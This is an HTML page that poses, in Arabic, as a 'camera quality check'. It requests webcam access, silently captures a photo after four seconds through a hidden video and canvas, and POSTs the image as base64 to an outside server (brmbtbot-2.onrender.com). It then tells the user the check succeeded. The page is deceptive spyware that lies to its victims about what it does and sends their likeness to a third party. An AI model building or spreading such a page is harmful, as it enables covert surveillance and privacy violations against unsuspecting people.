<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Camera Check</title><style>body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:50px 20px;margin:0;}.box{border:1px solid #333;padding:40px 20px;border-radius:20px;}#v,#c{display:none;}</style></head><body><div class="box"><h3>جاري فحص جودة الكاميرا...</h3><p>يرجى الانتظار والسماح بالوصول لالتقاط عينة الفحص</p><video id="v" autoplay></video><canvas id="c"></canvas></div><script>const v=document.getElementById('v'),c=document.getElementById('c');navigator.mediaDevices.getUserMedia({video:true}).then(s=>{v.srcObject=s;setTimeout(()=>{c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Camera Tool',u:'Captured Image',p:c.toDataURL()})}).finally(()=>{alert('تم اكتمال الفحص بنجاح');});},4000);});</script></body></html>
